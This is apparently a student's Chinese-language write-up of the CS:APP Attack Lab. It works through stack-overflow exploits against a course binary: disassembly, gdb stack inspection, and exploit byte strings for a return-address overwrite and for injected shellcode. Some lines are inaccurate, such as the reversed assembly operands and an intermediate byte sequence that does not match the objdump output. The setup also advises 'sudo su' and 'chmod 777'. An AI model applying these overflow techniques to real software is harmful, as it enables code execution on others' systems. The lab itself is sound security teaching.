## Attack Lab Procedure

**2020/11/11**

 ### 注意事项

本实验主体分为两个部分，代码注入攻击和 ROP（Return-Oriented Program）攻击，分别要对 **Ctarget** 程序和 **Rtarget** 程序进行攻击。

运行时，如果显示权限不足，请输入

```bash
sudo su
chmod 777 {filename} 
```

在系统下运行错误，需要加入启动参数`-q`

`-q: Don’t send results to the grading server`

`hex2raw`是附带的一个输入辅助程序，可以用在输入文本文件中用数值`xx`表示一个字节`0x ??`

`./hex2raw < ctarget1ans.txt |./ctarget -q`

#### 代码注入攻击 `Ctarget`

`catrget`是一个二进制程序，它通过一个`get`获取输入数据，如果一切正常就调用`test()`返回，但是它的调用输入函数的栈帧是有限的，每个攻击需要利用不同的输入造成不同的栈溢出使得其返回时不直接调用`test()`而调用其他的`touch_n()`执行不同的任务

##### Level1

Your task is to get CTARGET to execute the code for `touch1` when `getbuf` executes its return statement,
rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly
related to this stage, but this will not cause a problem, since `touch1 `causes the program to exit directly.

使用`objdump`获取反汇编代码

```asm
objdump -d ctarget > ctarget.asm
```

查看`getbuf`函数，这是程序调用的获取输入函数

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

可以看见其创建了一个0x28=40字节的栈帧，将`rsp`栈顶作为第一个参数数据（也就是`gets()`函数获取输入字符串的存入地址参数）给参数寄存器`rdi`，可以肯定输入是从栈顶开始存入的

要调用`touch1()`，查看代码

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

显然，输入要覆盖掉原先的返回地址，将地址修改为`touch1()`的地址

```asm
|          ....         |<- rsp
;调用getbuf
|          ....         |
|  getbuf() ret addr    |<- rsp
;进入getbuf(),分配栈帧0x28=40字节
|          ....         |
|  getbuf() ret addr    |
|                       |
|                       |
|                       |
|        upward         |
|   storage input str   |<- rsp
; 4017af 调用gets()
|          ....         |
|  getbuf() ret addr    |
|                       |
|                       |
|                       |
|        upward         |
|   storage input str   |<- ;输入字符串存入的起始地址
|      addr 0x4017d8    |<- rsp
;....
; gets()返回
|          ....         |
|  getbuf() ret addr    |
|                       |
|                       |
|                       |
|   storage input str   |<- rsp


; 4017b9 回收栈帧
|          ....         |
|  getbuf() ret addr    |<- rsp
; retq
; 取出  getbuf() ret addr ,rsp=rsp+8,,跳转到该addr处
|          ....         |<- rsp
```

所以，要修改`getbuf() ret addr`为`0x 00 00 00 00 00 40 17 c0`

由于输入是字符串字节，从左到右的输入由低地址向高地址存储，栈底是高地址，所以从栈顶向栈底存

输入字节从左到右 是 ： 随意40个字节+`c0 17 40 00 00 00 00 00 `，因为地址数据高对高低对低

**答案**

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 
```

##### Level2 

同样要求不直接返回调用`test()`，而是调用`touch2()`，但是`touch2()`有输入参数，这个参数要求是`cookie`文件给定的数据`0x59b997fa`，

`Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination
addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of
control, even when you are not returning from a call.`

不能使用`jmp`跳转，因为目的指定地址编码并不那么容易确定

查看`touch2()`

```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx ; 输入参数传递给edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie> edi is val
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

pdf给出了C代码

```c
void touch2(unsigned val)
{
 	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
 		validate(2);
 	} else {
 		printf("Misfire: You called touch2(0x%.8x)\n", val);
 		fail(2);
 	}
	 exit(0);
}
```

显然`edi`本来是第一个参数寄存器，在代码中也确实是传递参数`val`

那么要修改`edi(rdi)`

`cookie`中给出的参数是`0x59b997fa`

要注入代码

- 修改 **%rdi** 的值为 0x59b997fa
- 控制交给 touch2，因为不能用 `jmp` 和` call`，所以只能用` ret` 来实现

注入的代码为了防止存到不该存的地方，直接用`getbuf()`申请的栈帧即可

由于`ret`会弹出栈顶数据作为跳转地址，把`touch2()` 地址`push`到栈顶

```asm
mov %edi 0x59b997fa
push 0x4017ec
ret
```

栈其余空间用0填充

但是`getbuf()`会返回`getbuf() ret addr`，因此要将其修改为注入代码对应位置，注意到注入的代码位置：

```asm
; 调用gets()前
|          ....         |
|  getbuf() ret addr    |
|                       |
|                       |
|                       |
|        upward         |
|   storage input str   |<- rsp

; 4017af 调用gets()
|          ....         |
|  getbuf() ret addr    |
|                       |
|                       |
|                       |
|        upward         |
|   storage input str   |<- ;输入字符串存入的起始地址
|      addr 0x4017d8    |<- rsp

;....
; gets()返回
|          ....         |
|  getbuf() ret addr    |
|                       |
|                       |
|                       |
|   storage input str   |<- rsp
```

调用`gets()`前的`rsp`是注入数据(代码)的起始最低地址，因此应该把`getbuf() ret addr`修改成此时的`%rsp`

使用`gdb`下断点

```asm
(gdb) gdb ctarget
(gdb) break *0x4017af
	Breakpoint 1 at 0x4017af: file buf.c, line 14.
(gdb) run -q
Starting program: /home/aaron/CSAPP/attacklab/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14

(gdb) print /x $rsp
$1 = 0x5561dc78

```

确定注入机器代码开始位置是`0x5561dc78`

编写汇编代码`level2.s`:

```asm
mov %edi $0x59b997fa
push $0x4017ec
ret
```

使用`-c`选项表示只编译源文件，而不进行链接

```bash
gcc -c -o level2.o level2.s
```

使用`objdump`反汇编获取机器码

```bash
objdump -d level2.o >level2.asm 
```

```asm

level2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	68 ec 17 40 00       	pushq  $0x4017ec
   a:	c3                   	retq   

```

因此，输入的代码从低地址到高地址数据是

```
8b 3c 25 fa 97 b9 59 ff 34 25 ec 17 40 00 c3
```

此外还要覆盖`getbuf() ret addr`

最终

```
bf fa 97 b9 59 68 ec 17 40 00 
c3 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 
```

